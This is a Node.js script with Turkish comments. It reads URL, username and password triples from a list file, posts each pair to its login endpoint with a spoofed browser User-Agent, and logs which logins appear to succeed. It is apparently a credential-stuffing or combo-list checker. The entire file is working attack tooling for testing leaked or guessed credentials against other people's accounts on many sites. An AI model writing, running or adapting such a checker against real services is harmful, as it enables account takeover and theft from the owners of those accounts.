const https = require('https');
const http = require('http');
const fs = require('fs');
const readline = require('readline');

const INPUT_FILE = 'list.txt';
const OUTPUT_FILE = 'sonuclar.txt';
const TIMEOUT = 15000;
const DELAY_MS = 2000;

function normalizeUrl(rawUrl) {
    let url = rawUrl.trim();
    // Eğer // ile başlıyorsa, başına https: ekle
    if (url.startsWith('//')) {
        url = 'https:' + url;
    }
    // Eğer http:// veya https:// yoksa ekle
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
        url = 'https://' + url;
    }
    return url;
}

async function checkCredentials(rawUrl, username, password) {
    const url = normalizeUrl(rawUrl);
    return new Promise((resolve) => {
        let urlObj;
        try {
            urlObj = new URL(url);
        } catch (e) {
            return resolve({ success: false, url: rawUrl, username, reason: `Geçersiz URL: ${e.message}`, statusCode: null, snippet: '' });
        }
        const protocol = urlObj.protocol === 'https:' ? https : http;
        const postData = new URLSearchParams();
        postData.append('username', username);
        postData.append('password', password);
        const postDataString = postData.toString();
        const options = {
            hostname: urlObj.hostname,
            port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
            path: urlObj.pathname + urlObj.search,
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postDataString),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            timeout: TIMEOUT
        };
        const req = protocol.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                let success = false;
                let reason = `HTTP ${res.statusCode}`;
                if (res.statusCode === 200 || res.statusCode === 302 || res.statusCode === 301) {
                    success = true;
                    if (data.toLowerCase().includes('login') && data.toLowerCase().includes('error')) {
                        success = false;
                        reason = `HTTP ${res.statusCode} fakat sayfada hata var`;
                    } else if (data.toLowerCase().includes('invalid') || data.toLowerCase().includes('geçersiz')) {
                        success = false;
                        reason = `HTTP ${res.statusCode} fakat geçersiz bilgi mesajı var`;
                    }
                } else {
                    success = false;
                }
                const snippet = data.substring(0, 200).replace(/\n/g, ' ').replace(/\s+/g, ' ').trim();
                resolve({ success, url: rawUrl, username, statusCode: res.statusCode, reason, snippet });
            });
        });
        req.on('error', (err) => resolve({ success: false, url: rawUrl, username, statusCode: null, reason: err.code || err.message, snippet: '' }));
        req.on('timeout', () => { req.destroy(); resolve({ success: false, url: rawUrl, username, statusCode: null, reason: 'Timeout', snippet: '' }); });
        req.write(postDataString);
        req.end();
    });
}

async function processFile() {
    console.log(`📂 '${INPUT_FILE}' okunuyor...\n`);
    const resultStream = fs.createWriteStream(OUTPUT_FILE, { flags: 'a' });
    resultStream.write(`=== Çoklu Kontrol Sonuçları - ${new Date().toISOString()} ===\n`);
    let lineNumber = 0, successCount = 0, failCount = 0, errorCount = 0;
    const fileStream = fs.createReadStream(INPUT_FILE);
    const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity });
    for await (const line of rl) {
        lineNumber++;
        const trimmedLine = line.trim();
        if (trimmedLine === '' || trimmedLine.startsWith('#')) continue;
        const firstColon = trimmedLine.indexOf(':');
        if (firstColon === -1) { errorCount++; continue; }
        const secondColon = trimmedLine.indexOf(':', firstColon + 1);
        if (secondColon === -1) { errorCount++; continue; }
        let url = trimmedLine.substring(0, firstColon);
        const username = trimmedLine.substring(firstColon + 1, secondColon);
        const password = trimmedLine.substring(secondColon + 1);
        // URL'yi normalize et
        url = normalizeUrl(url);
        console.log(`\n🔍 [${lineNumber}] ${username} @ ${url}`);
        const result = await checkCredentials(url, username, password);
        if (result.success) {
            console.log(`✅ BAŞARILI: ${username} (${result.reason})`);
            resultStream.write(`BAŞARILI | ${result.url} | ${result.username} | ${result.reason} | ${result.snippet}\n`);
            successCount++;
        } else {
            console.log(`❌ BAŞARISIZ: ${username} - ${result.reason}`);
            resultStream.write(`BAŞARISIZ | ${result.url} | ${result.username} | ${result.reason} | ${result.snippet}\n`);
            failCount++;
        }
        await new Promise(resolve => setTimeout(resolve, DELAY_MS));
    }
    console.log(`\n📊 Tamamlandı. Başarılı: ${successCount}, Başarısız: ${failCount}, Hatalı format: ${errorCount}`);
    resultStream.write(`\nÖZET | Başarılı: ${successCount} | Başarısız: ${failCount} | Hatalı: ${errorCount}\n`);
    resultStream.end();
}

processFile().catch(err => console.error('❌ Hata:', err));